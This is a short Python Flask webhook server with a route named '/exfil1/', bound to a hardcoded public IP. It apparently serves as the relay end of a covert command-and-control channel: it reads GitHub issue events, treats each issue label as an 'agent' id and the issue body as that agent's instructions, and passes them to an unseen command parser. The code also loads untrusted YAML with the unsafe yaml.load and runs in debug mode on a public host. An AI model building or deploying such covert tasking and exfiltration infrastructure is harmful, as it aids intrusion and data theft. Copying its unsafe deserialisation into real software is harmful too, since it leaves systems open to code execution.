
from flask import Flask
from flask import request
from flask import jsonify
from flask_api import status
import json, yaml
from gitcommander import CommandParser

app = Flask(__name__)

@app.route('/exfil1/', methods=['POST'])
def sping():
	if request.method == 'POST':
		call=json.loads(request.data)
		print("Incoming request: {}".format(call['action']))
 		#print(call)
		if 'action' in call:
			if call['action'] == 'labeled':
				#process newly created issue
				if 'issue' in call:
					if 'body' in call['issue'] and \
							'labels' in call['issue'] and \
							'name' in call['issue']['labels'][0]:
							try:

								# which agent is calling us 
								agentid=call['issue']['labels'][0]['name']
								issue=call['issue']['number']

								# what is this agent's instructions
								body=yaml.load(call['issue']['body'])							
								print("Instructions from: ({}) : ".format(agentid))
								c=CommandParser(agentid, issue)
								c.parse(body)
							except yaml.scanner.ScannerError as yse:
								print("This body of this issue cannot be parsed: {}".format(yse))
								print(call['issue']['body'])
					else:
						print("This issue does not have a body or named labels")
		  				#print(call)
				else:
					print("This call is not a valid labeled issue")
		  			#print(call)
			else:
				print("This call is not a labeled issue")
		  		#print(call)
 		else:
			print("This call has no action")
	 		#print(call)

	return ''


@app.route('/')
def nothing_here():
    return ''


if __name__ == '__main__': 
	ssl_context = ('hook.crt', 'hook.key')
	app.run( debug=True, host = "192.34.57.211", ssl_context=ssl_context, port=8080)
